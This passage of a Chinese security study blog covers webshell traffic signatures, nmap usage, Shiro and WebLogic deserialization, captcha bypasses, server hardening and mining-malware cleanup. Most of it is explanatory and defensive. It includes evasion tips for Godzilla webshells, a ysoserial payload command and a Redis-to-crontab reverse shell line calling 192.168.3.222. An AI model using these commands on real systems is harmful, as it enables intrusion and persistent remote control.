class="line"></span><br><span class="line">4.请求体特征 (较强特征)</span><br><span class="line">截取到特征发现请求都含有&quot;pass=&quot;</span><br><span class="line">哥斯拉支持对加密的数据进行base64编码以及原始的加密raw两种形式的通讯数据，对于请求体的检测也要考虑两种情况。</span><br><span class="line"></span><br><span class="line">5.响应体特征 (强特征)</span><br><span class="line">和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ps:哥斯拉<strong>避免被查杀</strong>技巧：</p>
+<p>1.不使用默认密码（pass）</p>
+<p>2.修改ua头</p>
+<p>3.填充垃圾数据（post的左右）</p>
+<p><strong>优点</strong></p>
+<p>全部类型的shell均过市面所有静态查杀</p>
+<p>流量加密过市面全部流量waf</p>
+<p>Godzilla自带的插件是冰蝎、蚁剑不能比拟的</p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>–os-shell原理 ：就是用into outfile函数将一个可以用来上传的php文件写到网站的根目录下</p>
+<p>要求</p>
+<p>（1）网站必须是root权限</p>
+<p> （2）攻击者需要知道网站的绝对路径</p>
+<p> （3）GPC为off，php主动转义的功能关闭</p>
+<p><strong>流量特征</strong></p>
+<p>1.User-Agent  中带有sqlmap字样</p>
+<p>2.上传的小马中，包含所有的命令执行函数</p>
+<p>3.sqlmap 成功写入命令马的时候, 会执行一条测试语句<strong>echo command execution test</strong></p>
+<p>4.再就是sqlmap会判断当前的操作系统, 而判断操作系统就会使用 <strong>@@version_compile_os</strong></p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><strong>常规使用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-sS (SYN扫描)</span><br><span class="line"></span><br><span class="line">nmap默认端口扫描方式，执行半开扫描，不完成TCP握手流程。只向目标端口发送一个SYN报文，然后等待响应。</span><br><span class="line"></span><br><span class="line">SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。</span><br><span class="line"></span><br><span class="line">如果多次重发后仍没响应， 该端口就被标记为被过滤。</span><br><span class="line"></span><br><span class="line">-sT (TCP扫描)</span><br><span class="line"></span><br><span class="line">一般不使用，会留下连接日志。</span><br><span class="line"></span><br><span class="line">-sU（UDP扫描）</span><br><span class="line"></span><br><span class="line">nmap -v ip 显示详细的扫描过程</span><br><span class="line">nmap -p  ip  扫描指定端口</span><br><span class="line">nmap -A ip  全面扫描操作系统</span><br><span class="line">nmap -sP ip  进行ping扫描主机存活   </span><br><span class="line">nmap -Pn/-P0 ip 禁ping扫描</span><br><span class="line">nmap -sS ip 进行tcp syn扫描 也叫半开放扫描</span><br><span class="line">nmap -sT ip 进行tcp连接扫描 （准确性高）</span><br><span class="line"></span><br><span class="line">nmap -p 1-65535 全端口扫描</span><br></pre></td></tr></table></figure>
+
+<p><strong>nmap流量特征</strong></p>
+<p>1.nmap在使用SYN扫描时Windows的窗口值值固定是1024。</p>
+<p>2.扫描出的包里面会有一些关键字  比如nmap，nm，nm@p</p>
+<p>shiro721漏洞原理：<br>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">1、登录Shiro网站，从cookie中获得rememberMe字段的值。</span><br><span class="line">2、利用DNSlog探测，通过ysoserial工具payload。</span><br><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</span><br><span class="line">3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。</span><br><span class="line">4、使用构造的rememberMe攻击字符串重新请求网站</span><br><span class="line">5、成功触发Payload，在DNSLog获取到目标IP。</span><br></pre></td></tr></table></figure>
+
+<h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><p>IIS的全称是Internet Information Services（互联网信息服务），是微软提供的运行在Windows系统下的中间件，主要用来解析.ASP，.ASA，.CER三种文件格式的文件</p>
+<p>1、PUT漏洞</p>
+<p>2、短文件名猜解</p>
+<p>3、远程代码执行</p>
+<p>4、解析漏洞</p>
+<p>IIS 7.0</p>
+<p>上传合法的“图片”（图片木马）然后在URL后面加上“&#x2F;xxx.php”，就可以获得网站的WebShell，在使用菜刀链接即可。</p>
+<h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>1、解析漏洞</p>
+<p>2、目录遍历</p>
+<h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>1、文件解析</p>
+<p>2、目录遍历</p>
+<p>3、CRLF注入</p>
+<p>4、目录穿越</p>
+<h4 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a><strong>Tomcat</strong></h4><p>1、远程代码执行</p>
+<p>2、war后门文件部署</p>
+<h5 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h5><p>7001&#x2F;7002端口 t3协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">基于T3协议weblogic的反序列化漏洞</span><br><span class="line">EXP和目标服务器建立T3连接，目标服务器weblogic上的JVM虚拟机远程调用了监听程序中的方法执行序列化操作，将流量反弹到nc上</span><br><span class="line"></span><br><span class="line">Weblogic 文件上传漏洞</span><br><span class="line"></span><br><span class="line">Weblogic LDAP 远程代码执行漏洞</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH加固"><a href="#SSH加固" class="headerlink" title="SSH加固"></a>SSH加固</h3><p><strong>防火墙</strong></p>
+<p><strong>堡垒机</strong></p>
+<p>堡垒主是专门设计用于阻止来自网络的恶意流量和攻击的安全网关。堡垒在公共网络上公开的安全代理和审计服务，通过堡垒机和限制和审计用户操作，记录用户操作，可以对可疑操作进行告警或者直接阻断从而减少对主机威胁。当两个通道建立SSH连接时，设置堡垒主机可能有助于提高安全性并保护系统。</p>
+<p><strong>修改默认SSH设置</strong></p>
+<p>1.更改默认22端口  修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件</p>
+<p>2.禁用root登录</p>
+<h3 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a><strong>安全加固</strong></h3><p>1.<strong>口令复杂度策略</strong></p>
+<p>​	 口令长度至少8位，并包括数字、小写字母、大写字母和特殊符号</p>
+<p>2.<strong>多次登录失败锁定策略</strong></p>
+<p>​	系统应配置当用户连续认证失败次数超过5次，锁定该用户使用的账号</p>
+<p>3.<strong>多余账户锁定策略</strong></p>
+<p>应锁定与设备运行、维护等工作无关的账号。</p>
+<p>4.<strong>关键目录权限控制</strong></p>
+<p>根据安全需要，配置某些关键目录其所需的最小权限；</p>
+<p><strong>5.日志文件权限</strong></p>
+<p>只能追加数据，不能删除日志文件</p>
+<p>6.<strong>防止SQL注入及远程包含</strong></p>
+<p>SQL注入是非常危险的问题，小则网站后台被入侵，重则整个服务器沦陷，所以一定要小心。</p>
+<p>php.ini中有一个设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc = Off	改为     magic_quotes_gpc = On</span><br></pre></td></tr></table></figure>
+
+<p>在远程文件包含漏洞中，攻击者可以通过访问外部地址来加载远程代码，所以一定要设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = off</span><br></pre></td></tr></table></figure>
+
+<p>7.<strong>不使用默认密码和弱口令</strong></p>
+<p>检查各个组件或者数据库等的默认密码和弱口令，口令长度至少8位，并包括数字、小写字母、大写字母和特殊符号四类中至少两种</p>
+<p>8.<strong>禁止远程连接数据库</strong></p>
+<p>使用命令netstat 查看默认的3306端口是打开的，此时打开了mysql的网络监听，允许用户远程通过帐号密码连接数本地据库，默认情况是允许远程连接数据的。为了禁止该功能，启动skip-networking，不监听sql的任何TCP&#x2F;IP的连接，切断远程访问的权利，保证安全性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/my.cf       #将#skip-networking注释去掉</span><br></pre></td></tr></table></figure>
+
+<p>9.<strong>对重要数据加密存储</strong></p>
+<p>10.<strong>修改网站的某些默认端口</strong></p>
+<h3 id="内存马排查"><a href="#内存马排查" class="headerlink" title="内存马排查"></a>内存马排查</h3><p>内存马如何排查：如果发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪和分析，也是根据各类型的原理，列出一个排查思路——</p>
+<p>1、如果是jsp注入，日志中排查可以jsp的访问请求。</p>
+<p>2、如果是代码执行漏洞，排查中间件的error.log,查看是否有可疑的报错，判断注入时间和方法</p>
+<p>3、根据业务使用的组件排查可能存在的java代码执行漏洞，spring的controller了类型的话根据上报webshell的url查找日志，filter或者listener类型，可能会有较多的404但是带有参数的请求。</p>
+<h3 id="进程排查思路"><a href="#进程排查思路" class="headerlink" title="进程排查思路"></a><strong>进程排查思路</strong></h3><p>进程排查思路(火绒剑都可查看到)</p>
+<ul>
+<li>没有签名验证信息的进程</li>
+<li>没有描述信息的进程</li>
+<li>进程的启动用户</li>
+<li>进程的路径是否合法</li>
+<li>CPU或内存资源占用长时间过高的进程</li>
+</ul>
+<h3 id="登陆框可能存在的漏洞"><a href="#登陆框可能存在的漏洞" class="headerlink" title="登陆框可能存在的漏洞"></a>登陆框可能存在的漏洞</h3><p>1.首先看一下有没有对应的cms，如果是，则可以查一下该cms的历史漏洞</p>
+<p>2.看登陆框是否可以进行用户名爆破</p>
+<p>3.看有没有验证码，如果有，试试能不能绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">一、前端验证验证码，并没有后端验证。直接抓包然后进行跑数据包，反正有没有验证码的阻碍</span><br><span class="line"></span><br><span class="line">二、验证码设置了但是并没有效验，乱输验证码也能够成功的登录（估计老板没给开发工资吧）</span><br><span class="line"></span><br><span class="line">三、验证码可重复使用，如果验证码认证成功后没有将session及时清空，将会导致验证码首次认证成功之后可重复使用。</span><br><span class="line">实例: https://blog.csdn.net/</span><br><span class="line">四、空验证码绕过，验证码空值绕过，可以通过直接删除验证码参数或者Cookie中的值来绕过判断，进行暴力破解。</span><br><span class="line"></span><br><span class="line">五、验证码干扰过低，轻松使用脚本识别 https://blog.csdn.net/y0nghum1ng/</span><br><span class="line"></span><br><span class="line">六：验证码会在HTML页面输出。 https://blog.csdn.net/weixin_45606067/</span><br><span class="line"></span><br><span class="line">七、验证码可控制，比如他的验证码包含在URL里面，是一个URL传参，我们可以把URL设置定，那么验证码则可控制</span><br><span class="line"></span><br><span class="line">八、验证码有规则，比如是时间戳的后6位（rand函数进行随机数）</span><br><span class="line"></span><br><span class="line">九、有万能验证码，验证码无论是什么，只要输入000000就能直接绕过</span><br><span class="line"></span><br><span class="line">十、验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数</span><br><span class="line"></span><br><span class="line">十一、图片验证码，自动识别 http://weikeu.com/archives/ </span><br></pre></td></tr></table></figure>
+
+<p>4.登录框处看看是否存在sql注入</p>
+<p>5.是否存在弱口令或者万能密码</p>
+<p>6.看看有没有注册或者找回密码功能，测试这两个功能的漏洞</p>
+<p>7.还可以通过查看响应包，看看修改响应包的值能不能达到绕过检测的目的</p>
+<h3 id="HTTP字段"><a href="#HTTP字段" class="headerlink" title="HTTP字段"></a>HTTP字段</h3><p>Host：</p>
+<p>​				ip 指定主机名称 </p>
+<p>Accept:</p>
+<p>​				表示客户端期望服务器返回的媒体格式。</p>
+<p>Content-Length:</p>
+<p>​					响应体的长度 </p>
+<p>Content-Type：</p>
+<p>​			内容的类型，text／html，xml等 Server：服务器的信息 </p>
+<p>Connection:</p>
+<p>​				当客户端和服务器需要协商连接的属性时，可以使用Connection头部。比较常用的一个值是close，用来通知对方在当前请求结束后关闭连接。</p>
+<p>Referer</p>
+<p>​				Referer是非常常用的头，它表示请求的发起来源URI，也就是当前页面资源的父页面。</p>
+<p>X-Forwarded-For </p>
+<p>​			是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址，但是这个IP却未必是真实的，</p>
+<h3 id="挖矿木马"><a href="#挖矿木马" class="headerlink" title="挖矿木马"></a>挖矿木马</h3><p>应该首先查看挖矿进程所属的用户，根据挖矿进程的运行用户去排查该用户下是否还运行着其它进程，确定这些进程是否有经常被黑客利用的漏洞。如果有常见的漏洞，则应该重点对此进行排查</p>
+<p>Redis未授权访问、Docker API未授权访问，Hadoop Yarn 未授权访问、NFS未授权访问、Rsync弱口令、PostgreSQL弱口令、Tomcat弱口令、SSH弱口令、Telnet弱口令、Windows远程桌面弱口令；</p>
+<p>远程命令执行漏洞：WebLogic XML 反序列化漏洞、Jenkins反序列化、Jboss远程代码执行、Spring远程代码执行、ElasticSearch命令执行、永恒之蓝、Struts2系列漏洞、常见CMS的远程命令执行漏洞；</p>
+<p><strong>1.确定挖矿进程</strong></p>
+<p>可以使用命令直接筛选出占用CPU过高的可疑进程。</p>
+<p>部分挖矿进程的名字由不规则数字和字母组成，可直接看出（如ddg的qW3xT.4或zigw等）。</p>
+<p>也有的挖矿进程会修改进程名为常见名称，干扰运维人员，这种伪装方法比较简单（比如利用XHide修改进程名或直接修改可执行文件名），所以排查过程中也要关注所有占用CPU较高的可疑进程。</p>
+<p>如果看到了可疑进程，可以使用查看进程打开的文件，或查看指向的文件。</p>
+<p>lsof   proc</p>
+<p>如果挖矿木马有隐藏进程的功能，那么很难直接从top中确定可疑进程名。这时，可从以下几方面进行排查：</p>
+<p>1).是否替换了系统命令</p>
+<p>使用查看系统命令是否被替换，如果系统命令已经被替换，可直接从纯净系统拷贝ps，top，等命令到受感染主机上使用。</p>
+<p>可以看到，系统的三个命令均被替换。</p>
+<p>ps命令被替换后，会修改ps输出的内容，从而隐藏可疑进程。此时直接使用ps命令时，会导致查询不准确。比如gates木马会替换ps命令，直接使用ps -ef命令查看进程时，会隐藏一个位于&#x2F;usr&#x2F;bin&#x2F;下的进程。如下，使用busybox可看到可疑进程，但是使用系统的ps命令就不会看到进程。</p>
+<p>2).是否修改了动态链接库</p>
+<p>如果找不到占用CPU较高的进程，可考虑排查是否修改了动态链接库，使用或命令查看是否有预加载的动态链接库文件。</p>
+<p>3).以上情况都可以直接通过静态编译的busybox进行排查。</p>
+<p><strong>2.查看挖矿进程所属用户</strong></p>
+<p>一般挖矿进程为自动化攻击脚本，所以很少有提权的过程，那么很大可能挖矿进程所属用户即为攻击进入系统的用户。后续的排查过程可根据此寻找攻击者的入侵途径。</p>
+<p>两种方式都可以看到，挖矿进程所属用户为 weblogic。</p>
+<p><strong>3.查看用户进程</strong></p>
+<p>确定已失陷用户后，可查询该用户所属其他进程，判断其他进程是否有已知漏洞（Weblogic反序列化、Struts2系列漏洞、Jenkins RCE）或弱口令（Redis未授权、Hadoop yarn未授权、SSH弱口令）等问题。</p>
+<p>可以看到，weblogic用户下除了两个挖矿进程，还有一个weblogic应用的进程，所以这时候就应该判断该该weblogic应用是否有已知的漏洞（比如WebLogic反序列化漏洞）。如果有的话，那么该挖矿进程很可能是利用了该漏洞进入主机。</p>
+<p><strong>4.确定原因</strong></p>
+<p>排查出挖矿木马后对木马类型进行分析，根据木马的传播特征和传播方式，初步判断本次入侵的原因。然后结合应用日志以及漏洞利用残留文件确定本次攻击是否利用了该漏洞。</p>
+<p>比如，利用redis未授权访问漏洞后，一般会修改redis的<strong>dbfilename</strong>和<strong>dir</strong>的配置，并且使用reids写文件时，会在文件中残留redis和版本号标识，可以根据以上两个信息排查是否利用了redis。</p>
+<p>0x04 清除挖矿木马</p>
+<p>1.及时隔离主机</p>
+<p>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机，对同一局域网内的其他主机进行已知漏洞的扫描和进一步利用，所以发现挖矿现象后，在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析。</p>
+<p>\2. 阻断与矿池通讯</p>
+<p>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</p>
+<p>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</p>
+<p>\3. 清除定时任务</p>
+<p>大部分挖矿进程会在受感染主机中写入定时任务完成程序的驻留，当安全人员只清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或直接执行挖矿脚本，导致挖矿进程清除失败。</p>
+<p>使用或查看是否有可疑定时任务，有的话直接删除，或停止crond进程。</p>
+<p>还有</p>
+<p>等文件夹或文件中的内容也要关注。</p>
+<p>\4. 清除启动项</p>
+<p>还有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿进程还能重新启动。所以在清除时还应该关注启动项中的内容，如果有可疑的启动项，也应该进行排查，确认是挖矿进程后，对其进行清除。</p>
+<p>排查过程中重点应该关注：</p>
+<p>等目录或文件下的内容。</p>
+<p>\5. 清除公钥文件</p>
+<p>在用户家目录的.ssh目录下放置authoruzed_keys文件，从而免密登陆该机器也是一种常见的保持服务器控制权的手段。在排查过程中应该查看该文件中是否有可疑公钥信息，有的话直接删除，避免攻击者再次免密登陆该主机。</p>
+<p>\6. kill挖矿进程</p>
+<p>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底。</p>
+<p>在实际的清除工作中，应找到本机上运行的挖矿脚本，根据脚本的执行流程确定木马的驻留方式，并按照顺序进行清除，避免清除不彻底。</p>
+<h3 id="session-cookie-token区别"><a href="#session-cookie-token区别" class="headerlink" title="session cookie token区别"></a>session cookie token区别</h3><p> session理解为是“会话”，   代表着服务器和客户端一次会话的过程   当用户打开某个web应用时，便与web服务器产生一次session 服务器使用session把用户的信息临时保存在了服务器上，用户离开网站后session会被销毁。这种用户信息存储方式相对cookie来说更安全，可是session有一个缺陷：如果web服务器做了负载均衡，那么下一个操作请求到了另一台服务器的时候session会丢失。</p>
+<p>cookie</p>
+<p>保持用户的登录状态</p>
+<p> cookie是保存在本地终端的数据。cookie由服务器生成，发送给浏览器，浏览器把cookie以kv形式保存到某个目录下的文本文件内，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间，所以每个域的cookie数量是有限的。</p>
+<p>token就是令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件</p>
+<h3 id="做了cdn的网站如何获取真实IP"><a href="#做了cdn的网站如何获取真实IP" class="headerlink" title="做了cdn的网站如何获取真实IP"></a>做了cdn的网站如何获取真实IP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 超级ping  如果ip不一样  说明有cdn</span><br><span class="line"></span><br><span class="line">2. nslookup **http://xxx.com** 国外dns</span><br><span class="line"></span><br><span class="line">3. 查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址</span><br><span class="line"></span><br><span class="line">4. 子域名查询 一般子域名没有cdn</span><br><span class="line"></span><br><span class="line"> 5.   邮件服务查询</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="redis未授权漏洞"><a href="#redis未授权漏洞" class="headerlink" title="redis未授权漏洞"></a>redis未授权漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line"></span><br><span class="line">1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</span><br><span class="line"></span><br><span class="line">服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSRF，即Server-Side Request Forgery(服务器端请求伪造)，是攻击者利用服务器发起伪造请求来实现攻击</span><br><span class="line"></span><br><span class="line">比如我要通过A网站访问某文件，通过黑客的行为修改请求后，可能访问的是B主机的某个敏感文件</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="常见的高危端口有哪些"><a href="#常见的高危端口有哪些" class="headerlink" title="常见的高危端口有哪些"></a>常见的高危端口有哪些</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">443：HTTPS端口，心脏滴血等与SSL有关的漏洞</span><br><span class="line"></span><br><span class="line">445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010 （tcp）</span><br><span class="line"></span><br><span class="line">1433：SQL Server对外提供服务端口</span><br><span class="line"></span><br><span class="line">1521：oracle数据库端口</span><br><span class="line"></span><br><span class="line">3306：MySQL数据库端口，可能存在 弱口令暴力破解</span><br><span class="line"></span><br><span class="line">3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现</span><br><span class="line"></span><br><span class="line">6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞</span><br><span class="line"></span><br><span class="line">7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</span><br><span class="line"></span><br><span class="line">8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell   （tcp）</span><br><span class="line">8080-8090：可能存在web服务</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="挖洞流程"><a href="#挖洞流程" class="headerlink" title="挖洞流程"></a>挖洞流程</h2><p>拿到一个主站的域名之后</p>
+<p>1.信息搜集</p>
+<p>利用oneforall和一些在线子域名爆破网站进行一下子域名的爆破，然后进行去重，再利用fofa等网站探查一下一些站点的指纹和框架。看看有没有一些cms可以利用。   whois反查</p>
+<p>2.漏洞测试</p>
+<p>根据筛选的站点，有针对性的进行端口探测，目录探测，看看有没有站长留下的一些敏感文件或者压缩包之类的。根据端口的开放情况有针对性的进行漏洞利用检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">过滤逗号绕过</span><br><span class="line">  使用offset关键字绕过</span><br><span class="line">   from...for.. 替换1，1</span><br><span class="line">单引号绕过</span><br><span class="line">    通过宽字节绕过。即通过在引号前面添加%D6、%df等字符，令其与&quot;\&quot;组合成新的编码，解析成为汉字，以此来消除&quot;\&quot;对引号的影响</span><br><span class="line">    XXE  注入   日志泄露  文件上传   XSS 反序列化  配置错误  信息泄露</span><br><span class="line">    </span><br><span class="line">   weblogic的ssrf配合redis反弹shell</span><br><span class="line">    set 1 “ * * * * * root bash -i &gt;&amp; /dev/tcp/192.168.3.222/7778 0&gt;&amp;1 ”</span><br><span class="line">    config set dir /etc/</span><br><span class="line">    config set dbfilename crontab</span><br><span class="line">    save</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>：把序列化的字符串再转化成原来的变量使用</p>
+<p>当传给 unserialize() 的参数可控时，那么就可以注入payload(<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)%EF%BC%8C%E8%80%8C%E5%BD%93%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E6%9C%89%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A7%A6%E5%8F%91%E5%AF%B9%E8%B1%A1%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%8C%E9%80%A0%E6%88%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%81">https://so.csdn.net/so/search?q=payload&amp;spm=1001.2101.3001.7020)，而当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成命令执行！</a></p>
+<p>文件删除  unlink()</p>
+<p>ssrf   curl_exec()   file_get_contents( )</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h2><p>java的反序列化，普遍特征：</p>
+<p>对于没有回显的情况，查看十六进制</p>
+<p>TCP：必有aced0005，这个16进制流基本上也意味者java反序列化的开始；</p>
+<p>HTTP：必有rO0AB，其实这就是aced0005的base64编码的结果；</p>
+<h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>原理也是jdni注入 利用就是构造一个json字符，用@type指定一个类库，流量特征就是json autotype</p>
+<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><h3 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h3><p>漏洞原理：Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值-&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
+<h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h3><p>shiro 550</p>
+<p>shiro 721</p>
+<p>shiro550漏洞原理：Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
+<p>Shiro反序列化有两种常用的加密模式，分别是CBC和GCM</p>
+<p><strong>特征：</strong></p>
+<p>1.在返回包的 Set-Cookie 中存在 <code>rememberMe=deleteMe</code> 字段，但是可能存在误报，可以尝试使用常见的AES密钥对rememberMe的值进行遍历解密尝试，如果可以成功解密的话再对解密的结果进行常见利用链的关键类名特征检测</p>
+<p>2.数据包含有多个$$$符号，C参数有base64编码</p>
+<h3 id="weblogic-1"><a href="#weblogic-1" class="headerlink" title="weblogic"></a>weblogic</h3><p>T3协议的反序列化漏洞，通过xmldecoder导致的xml解析代码执行。弱口令。</p>
+<p>流量特征:不加密，常见的出网协议也可以用。有很多T3协议的特征，文件操作和冰蝎一样有fileoutstream字段。</p>
+<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p><img src="/images/image-20230522163000534.png" alt="image-20230522163000534"></p>
